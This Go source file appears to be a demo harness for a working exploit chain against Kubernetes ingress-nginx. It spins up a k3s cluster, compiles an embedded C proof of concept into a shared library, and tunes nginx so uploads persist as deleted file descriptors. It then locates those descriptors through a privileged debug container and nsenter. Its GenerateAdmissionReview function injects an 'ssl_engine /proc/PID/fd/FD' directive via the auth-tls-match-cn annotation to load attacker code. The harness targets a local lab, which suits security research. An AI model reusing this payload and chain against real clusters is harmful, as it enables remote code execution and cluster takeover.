package ekoparty

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/anderseknert/kube-review/pkg/admission"
	"github.com/docker/docker/api/types/container"
	"github.com/testcontainers/testcontainers-go"
	"github.com/testcontainers/testcontainers-go/modules/k3s"
	"github.com/testcontainers/testcontainers-go/wait"
	corev1 "k8s.io/api/core/v1"
	networkingv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/client-go/tools/portforward"
	"k8s.io/client-go/tools/remotecommand"
	"k8s.io/client-go/transport/spdy"
	"k8s.io/client-go/util/flowcontrol"
	"k8s.io/klog/v2"
	"k8s.io/utils/ptr"

	_ "embed"
)

//go:embed testdata/poc.c
var pocSource []byte

func init() {
	klog.InitFlags(nil)
	flag.Set("logtostderr", "false")
	flag.Set("alsologtostderr", "false")
	flag.Set("stderrthreshold", "FATAL")
}

const (
	ingressNamespace   = "ingress-nginx"
	ingressDeployment  = "ingress-nginx-controller"
	ingressServiceName = "ingress-nginx-controller"
	tlsSecretName      = "ekoparty"
	tlsSecretNamespace = "default"
	manifestURL        = "https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.12.0/deploy/static/provider/cloud/deploy.yaml"
	k3sImageName       = "rancher/k3s:v1.32.9-k3s1"
	executorImageName  = "public.ecr.aws/docker/library/alpine:3.22"
	debugImageName     = "public.ecr.aws/docker/library/alpine:3.22"
)

// Logger defines the interface for logging operations.
type Logger interface {
	Log(format string, args ...any)
}

type noopLogger struct{}

func (noopLogger) Log(format string, args ...any) {}

// Cluster manages a k3s test cluster with its dependencies.
type Cluster struct {
	k3s       *k3s.K3sContainer
	executor  testcontainers.Container
	clientset *kubernetes.Clientset
	config    *rest.Config
	log       Logger
}

// New creates a new Cluster with default logging.
func New(ctx context.Context) (*Cluster, error) {
	return newCluster(ctx, noopLogger{})
}

// NewWithLogger creates a new Cluster with custom logging.
func NewWithLogger(ctx context.Context, log Logger) (*Cluster, error) {
	return newCluster(ctx, log)
}

func newCluster(ctx context.Context, log Logger) (*Cluster, error) {
	if err := os.Setenv("TESTCONTAINERS_RYUK_DISABLED", "true"); err != nil {
		return nil, fmt.Errorf("disable ryuk: %w", err)
	}

	log.Log("downloading manifest")
	manifestPath, err := downloadManifest(manifestURL)
	if err != nil {
		return nil, err
	}
	defer os.Remove(manifestPath)

	log.Log("starting k3s")
	opts := []testcontainers.ContainerCustomizer{
		testcontainers.WithConfigModifier(func(cfg *container.Config) {
			cfg.Cmd = []string{
				"server",
				"--disable=traefik",
				"--disable=servicelb",
				"--disable=metrics-server",
				"--disable=local-storage",
			}
		}),
		k3s.WithManifest(manifestPath),
		reuseContainer("k3s-ekoparty"),
	}

	k3sContainer, err := k3s.Run(ctx, k3sImageName, opts...)
	if err != nil {
		return nil, fmt.Errorf("start k3s: %w", err)
	}

	kubeconfig, err := k3sContainer.GetKubeConfig(ctx)
	if err != nil {
		return nil, fmt.Errorf("get kubeconfig: %w", err)
	}

	config, err := clientcmd.RESTConfigFromKubeConfig(kubeconfig)
	if err != nil {
		return nil, fmt.Errorf("create config: %w", err)
	}
	config.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(50, 100)

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, fmt.Errorf("create clientset: %w", err)
	}

	cluster := &Cluster{
		k3s:       k3sContainer,
		clientset: clientset,
		config:    config,
		log:       log,
	}

	log.Log("waiting for ingress")
	if err := cluster.waitForDeployment(ctx, ingressNamespace, ingressDeployment, 4*time.Minute); err != nil {
		return nil, err
	}

	log.Log("setting up tls")
	if err := cluster.setupTLSSecret(ctx); err != nil {
		return nil, err
	}

	log.Log("cluster ready")
	return cluster, nil
}

// CreateExecutor sets up the executor container for compiling the exploit.
func (c *Cluster) CreateExecutor(ctx context.Context) error {
	c.log.Log("creating executor")

	req := testcontainers.ContainerRequest{
		Image:      executorImageName,
		Cmd:        []string{"sleep", "infinity"},
		User:       "root",
		WaitingFor: wait.ForLog("").WithStartupTimeout(10 * time.Second),
	}

	genericReq := testcontainers.GenericContainerRequest{
		ContainerRequest: req,
		Started:          true,
	}

	if err := reuseContainer("executor-ekoparty").Customize(&genericReq); err != nil {
		return err
	}

	executor, err := testcontainers.GenericContainer(ctx, genericReq)
	if err != nil {
		return fmt.Errorf("create executor: %w", err)
	}
	c.executor = executor

	c.log.Log("installing deps")
	installCmd := []string{"sh", "-c", "apk add --no-cache gcc musl-dev openssl-dev"}
	if _, _, err := c.executor.Exec(ctx, installCmd); err != nil {
		return fmt.Errorf("install build dependencies: %w", err)
	}

	c.log.Log("executor ready")
	return nil
}

// CompilePoc compiles the exploit code.
func (c *Cluster) CompilePoc(ctx context.Context) error {
	if c.executor == nil {
		return fmt.Errorf("executor not created")
	}

	c.log.Log("compiling exploit")

	if err := c.executor.CopyToContainer(ctx, pocSource, "/tmp/poc.c", 0644); err != nil {
		return fmt.Errorf("copy source: %w", err)
	}

	compileCmd := []string{"gcc", "-fPIC", "-shared", "-o", "/tmp/poc.so", "/tmp/poc.c", "-lcrypto"}

	exitCode, reader, err := c.executor.Exec(ctx, compileCmd)
	if err != nil {
		return fmt.Errorf("exec compile: %w", err)
	}

	if exitCode != 0 {
		output, _ := io.ReadAll(reader)
		return fmt.Errorf("compilation failed (exit %d): %s", exitCode, output)
	}

	c.log.Log("exploit compiled")
	return nil
}

// Payload returns the compiled exploit payload.
func (c *Cluster) Payload(ctx context.Context) ([]byte, error) {
	if c.executor == nil {
		return nil, fmt.Errorf("executor not created")
	}

	reader, err := c.executor.CopyFileFromContainer(ctx, "/tmp/poc.so")
	if err != nil {
		return nil, fmt.Errorf("copy from container: %w", err)
	}
	defer reader.Close()

	data, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("read tar content: %w", err)
	}

	if len(data) < 4 || data[0] != 0x7f || data[1] != 'E' || data[2] != 'L' || data[3] != 'F' {
		return nil, fmt.Errorf("invalid ELF file (got %d bytes, header: %x)",
			len(data), data[:min(16, len(data))])
	}

	return data, nil
}

// UpdateNginxConfig modifies the nginx configuration.
func (c *Cluster) UpdateNginxConfig(ctx context.Context) error {
	c.log.Log("updating nginx config")

	cm, err := c.clientset.CoreV1().ConfigMaps(ingressNamespace).Get(ctx, "ingress-nginx-controller", metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("get configmap: %w", err)
	}

	if cm.Data == nil {
		cm.Data = make(map[string]string)
	}

	cm.Data["worker-processes"] = "1"
	cm.Data["client-body-buffer-size"] = "1k"

	if _, err := c.clientset.CoreV1().ConfigMaps(ingressNamespace).Update(ctx, cm, metav1.UpdateOptions{}); err != nil {
		return fmt.Errorf("update configmap: %w", err)
	}

	c.log.Log("config updated")
	return nil
}

// RestartIngress triggers a restart of the ingress controller.
func (c *Cluster) RestartIngress(ctx context.Context) error {
	c.log.Log("restarting ingress")

	deployment, err := c.clientset.AppsV1().Deployments(ingressNamespace).Get(ctx, ingressDeployment, metav1.GetOptions{})
	if err != nil {
		return err
	}

	if deployment.Spec.Template.Annotations == nil {
		deployment.Spec.Template.Annotations = make(map[string]string)
	}
	deployment.Spec.Template.Annotations["kubectl.kubernetes.io/restartedAt"] = metav1.Now().Format(time.RFC3339)

	if _, err := c.clientset.AppsV1().Deployments(ingressNamespace).Update(ctx, deployment, metav1.UpdateOptions{}); err != nil {
		return err
	}

	if err := c.waitForDeploymentRollout(ctx, ingressNamespace, ingressDeployment, 3*time.Minute); err != nil {
		return err
	}

	c.log.Log("ingress restarted")
	return nil
}

// IngressPod returns the name of the ingress controller pod.
func (c *Cluster) IngressPod(ctx context.Context) (string, error) {
	pods, err := c.clientset.CoreV1().Pods(ingressNamespace).List(ctx, metav1.ListOptions{
		LabelSelector: "app.kubernetes.io/name=ingress-nginx,app.kubernetes.io/component=controller",
	})
	if err != nil || len(pods.Items) == 0 {
		return "", fmt.Errorf("no ingress pods found")
	}
	return pods.Items[0].Name, nil
}

// CreateDebugContainer attaches a debug container to the specified pod.
func (c *Cluster) CreateDebugContainer(ctx context.Context, podName string) error {
	c.log.Log("creating debug container")

	pod, err := c.clientset.CoreV1().Pods(ingressNamespace).Get(ctx, podName, metav1.GetOptions{})
	if err != nil {
		return err
	}

	ephemeral := corev1.EphemeralContainer{
		EphemeralContainerCommon: corev1.EphemeralContainerCommon{
			Name:    "debugger",
			Image:   debugImageName,
			Command: []string{"sh", "-c", "sleep infinity"},
			SecurityContext: &corev1.SecurityContext{
				Capabilities: &corev1.Capabilities{
					Add: []corev1.Capability{"SYS_ADMIN", "SYS_PTRACE"},
				},
				Privileged: ptr.To(true),
			},
		},
		TargetContainerName: "controller",
	}

	pod.Spec.EphemeralContainers = append(pod.Spec.EphemeralContainers, ephemeral)
	if _, err := c.clientset.CoreV1().Pods(ingressNamespace).UpdateEphemeralContainers(ctx, podName, pod, metav1.UpdateOptions{}); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)
	c.log.Log("debug container ready")
	return nil
}

// MonitorDeletedFDs searches for deleted file descriptors in the target pod.
func (c *Cluster) MonitorDeletedFDs(ctx context.Context, podName string, expectedSize int64) (pid, fd string, err error) {
	cmd := []string{
		"nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "sh", "-c",
		"find /proc/*/fd -type l -exec ls -l {} \\; 2>/dev/null | grep deleted",
	}

	output, err := c.execPod(ctx, ingressNamespace, podName, "debugger", cmd)
	if err != nil || !strings.Contains(output, "deleted") {
		return "", "", fmt.Errorf("no deleted fds found")
	}

	for _, line := range strings.Split(output, "\n") {
		if !strings.Contains(line, "/proc/") || !strings.Contains(line, "/fd/") {
			continue
		}

		var fdPath string
		for _, field := range strings.Fields(line) {
			if strings.HasPrefix(field, "/proc/") && strings.Contains(field, "/fd/") {
				fdPath = field
				break
			}
		}

		if fdPath == "" {
			continue
		}

		parts := strings.Split(strings.TrimPrefix(fdPath, "/proc/"), "/")
		if len(parts) < 3 {
			continue
		}

		return parts[0], parts[2], nil
	}

	return "", "", fmt.Errorf("no fd with matching size found (expected >= %d)", expectedSize)
}

// Logs returns the logs from the specified pod.
func (c *Cluster) Logs(ctx context.Context, podName string, tailLines int64) (string, error) {
	opts := &corev1.PodLogOptions{
		Container: "controller",
		TailLines: ptr.To(tailLines),
	}
	req := c.clientset.CoreV1().Pods(ingressNamespace).GetLogs(podName, opts)

	stream, err := req.Stream(ctx)
	if err != nil {
		return "", err
	}
	defer stream.Close()

	buf := new(bytes.Buffer)
	if _, err := io.Copy(buf, stream); err != nil {
		return "", err
	}

	return buf.String(), nil
}

// WatchLogs streams pod logs and returns when the pattern is found.
func (c *Cluster) WatchLogs(ctx context.Context, podName, pattern string) error {
	opts := &corev1.PodLogOptions{
		Container: "controller",
		Follow:    true,
		TailLines: ptr.To(int64(10)),
	}

	req := c.clientset.CoreV1().Pods(ingressNamespace).GetLogs(podName, opts)
	stream, err := req.Stream(ctx)
	if err != nil {
		return fmt.Errorf("stream logs: %w", err)
	}
	defer stream.Close()

	scanner := bufio.NewScanner(stream)
	scanner.Buffer(make([]byte, 64*1024), 1024*1024)

	for scanner.Scan() {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if strings.Contains(scanner.Text(), pattern) {
			return nil
		}
	}

	if err := scanner.Err(); err != nil {
		return fmt.Errorf("scanner error: %w", err)
	}

	return fmt.Errorf("pattern %q not found", pattern)
}

// ForwardServicePort forwards a service port to a local port.
func (c *Cluster) ForwardServicePort(ctx context.Context, localPort int, stopCh, readyCh chan struct{}) error {
	svc, err := c.clientset.CoreV1().Services(ingressNamespace).Get(ctx, ingressServiceName, metav1.GetOptions{})
	if err != nil {
		return err
	}

	selector := metav1.FormatLabelSelector(&metav1.LabelSelector{MatchLabels: svc.Spec.Selector})
	pods, err := c.clientset.CoreV1().Pods(ingressNamespace).List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err != nil || len(pods.Items) == 0 {
		return fmt.Errorf("no pods for service")
	}

	return c.forwardPort(ctx, ingressNamespace, pods.Items[0].Name, 80, localPort, stopCh, readyCh)
}

// ForwardPodPort forwards a pod port to a local port.
func (c *Cluster) ForwardPodPort(ctx context.Context, podName string, podPort, localPort int, stopCh, readyCh chan struct{}) error {
	return c.forwardPort(ctx, ingressNamespace, podName, podPort, localPort, stopCh, readyCh)
}

// Destroy cleans up the cluster resources.
func (c *Cluster) Destroy(ctx context.Context) error {
	_ = c.clientset.CoreV1().Secrets(tlsSecretNamespace).Delete(ctx, tlsSecretName, metav1.DeleteOptions{})

	if c.executor != nil {
		_ = c.executor.Terminate(ctx)
	}

	return c.k3s.Terminate(ctx)
}

// GenerateAdmissionReview creates an admission review payload for the exploit.
func GenerateAdmissionReview(pid, fd int) ([]byte, error) {
	// malicious := fmt.Sprintf("CN=ekoparty #(\n){}\n }}\nssl_engine ../../../../../../proc/%d/fd/%d;\n#", pid, fd)
	malicious := fmt.Sprintf("CN=ekoparty #(\n){}\n }}\nssl_engine /proc/%d/fd/%d;\n#", pid, fd)

	ingress := &networkingv1.Ingress{
		TypeMeta: metav1.TypeMeta{
			Kind:       "Ingress",
			APIVersion: "networking.k8s.io/v1",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:      "ekoparty",
			Namespace: "default",
			Annotations: map[string]string{
				"nginx.ingress.kubernetes.io/auth-tls-match-cn": malicious,
				"nginx.ingress.kubernetes.io/auth-tls-secret":   "default/ekoparty",
			},
		},
		Spec: networkingv1.IngressSpec{
			IngressClassName: ptr.To("nginx"),
			Rules: []networkingv1.IngressRule{{
				Host: "ekoparty.com",
				IngressRuleValue: networkingv1.IngressRuleValue{
					HTTP: &networkingv1.HTTPIngressRuleValue{
						Paths: []networkingv1.HTTPIngressPath{{
							Path:     "/",
							PathType: ptr.To(networkingv1.PathTypePrefix),
							Backend: networkingv1.IngressBackend{
								Service: &networkingv1.IngressServiceBackend{
									Name: "kubernetes",
									Port: networkingv1.ServiceBackendPort{Number: 443},
								},
							},
						}},
					},
				},
			}},
		},
	}

	ingressBytes, err := json.Marshal(ingress)
	if err != nil {
		return nil, err
	}

	return admission.CreateAdmissionReviewRequest(ingressBytes, "create", "ekoparty", []string{"system:gopher"}, 2)
}

func (c *Cluster) setupTLSSecret(ctx context.Context) error {
	if _, err := c.clientset.CoreV1().Secrets(tlsSecretNamespace).Get(ctx, tlsSecretName, metav1.GetOptions{}); err == nil {
		return nil
	}

	certPEM, keyPEM, err := generateSelfSignedCert()
	if err != nil {
		return err
	}

	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      tlsSecretName,
			Namespace: tlsSecretNamespace,
		},
		Type: corev1.SecretTypeTLS,
		Data: map[string][]byte{
			"tls.crt": certPEM,
			"tls.key": keyPEM,
		},
	}

	_, err = c.clientset.CoreV1().Secrets(tlsSecretNamespace).Create(ctx, secret, metav1.CreateOptions{})
	return err
}

func (c *Cluster) forwardPort(ctx context.Context, namespace, podName string, podPort, localPort int, stopCh, readyCh chan struct{}) error {
	req := c.clientset.CoreV1().RESTClient().Post().
		Resource("pods").
		Namespace(namespace).
		Name(podName).
		SubResource("portforward")

	transport, upgrader, err := spdy.RoundTripperFor(c.config)
	if err != nil {
		return err
	}

	dialer := spdy.NewDialer(upgrader, &http.Client{Transport: transport}, "POST", req.URL())
	ports := []string{fmt.Sprintf("%d:%d", localPort, podPort)}

	fw, err := portforward.New(dialer, ports, stopCh, readyCh, io.Discard, io.Discard)
	if err != nil {
		return err
	}

	return fw.ForwardPorts()
}

func (c *Cluster) execPod(ctx context.Context, namespace, podName, container string, cmd []string) (string, error) {
	req := c.clientset.CoreV1().RESTClient().Post().
		Resource("pods").
		Name(podName).
		Namespace(namespace).
		SubResource("exec").
		VersionedParams(&corev1.PodExecOptions{
			Container: container,
			Command:   cmd,
			Stdout:    true,
			Stderr:    true,
		}, scheme.ParameterCodec)

	exec, err := remotecommand.NewSPDYExecutor(c.config, "POST", req.URL())
	if err != nil {
		return "", err
	}

	var stdout, stderr bytes.Buffer
	err = exec.StreamWithContext(ctx, remotecommand.StreamOptions{
		Stdout: &stdout,
		Stderr: &stderr,
	})

	if err != nil && stderr.Len() > 0 {
		return stdout.String(), fmt.Errorf("%w: %s", err, stderr.String())
	}

	return stdout.String(), err
}

func (c *Cluster) waitForDeployment(ctx context.Context, namespace, name string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		deploy, err := c.clientset.AppsV1().Deployments(namespace).Get(ctx, name, metav1.GetOptions{})
		if err == nil && deploy.Status.ReadyReplicas > 0 {
			return nil
		}
		time.Sleep(500 * time.Millisecond)
	}
	return fmt.Errorf("deployment %s/%s not ready", namespace, name)
}

func (c *Cluster) waitForDeploymentRollout(ctx context.Context, namespace, name string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		deploy, err := c.clientset.AppsV1().Deployments(namespace).Get(ctx, name, metav1.GetOptions{})
		if err != nil {
			return err
		}

		if deploy.Status.ObservedGeneration >= deploy.Generation &&
			deploy.Status.UpdatedReplicas == *deploy.Spec.Replicas &&
			deploy.Status.AvailableReplicas == *deploy.Spec.Replicas &&
			deploy.Status.UnavailableReplicas == 0 {
			return nil
		}
		time.Sleep(500 * time.Millisecond)
	}
	return fmt.Errorf("rollout timeout")
}

func downloadManifest(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	tmpFile, err := os.CreateTemp("", "manifest-*.yaml")
	if err != nil {
		return "", err
	}

	if _, err := io.Copy(tmpFile, resp.Body); err != nil {
		tmpFile.Close()
		os.Remove(tmpFile.Name())
		return "", err
	}

	tmpFile.Close()
	return tmpFile.Name(), nil
}

func generateSelfSignedCert() (certPEM, keyPEM []byte, err error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName:   "ekoparty.com",
			Organization: []string{"Ekoparty"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"ekoparty.com", "*.ekoparty.com"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, nil, err
	}

	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM = pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	return certPEM, keyPEM, nil
}

type reuseContainer string

func (r reuseContainer) Customize(req *testcontainers.GenericContainerRequest) error {
	req.Reuse = true
	req.Name = string(r)
	return nil
}
